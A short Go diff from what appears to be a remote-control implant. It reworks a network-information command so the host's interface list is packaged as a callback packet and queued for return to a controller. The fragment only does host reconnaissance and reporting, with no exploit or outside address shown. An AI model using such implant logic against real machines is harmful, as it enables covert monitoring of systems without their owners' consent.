@@ -3,15 +3,16 @@ package command
 import (
 	"bytes"
 	"fmt"
+	"main/packet"
 	"main/util"
 	"net"
 	"strings"
 )
 
-func GetNetworkInformation(b []byte) ([]byte, error) {
+func GetNetworkInformation(b []byte) error {
 	interfaces, err := net.Interfaces()
 	if err != nil {
-		return nil, err
+		return err
 	}
 	var result string
 	for _, i := range interfaces {
@@ -38,5 +39,7 @@ func GetNetworkInformation(b []byte) ([]byte, error) {
 	buf := bytes.NewBuffer(b)
 	pendingRequest := make([]byte, 4)
 	buf.Read(pendingRequest)
-	return util.BytesCombine(pendingRequest, []byte(result)), nil
+	finPacket := packet.MakePacket(CALLBACK_PENDING, util.BytesCombine(pendingRequest, []byte(result)))
+	packet.PushResult(finPacket)
+	return nil
 }
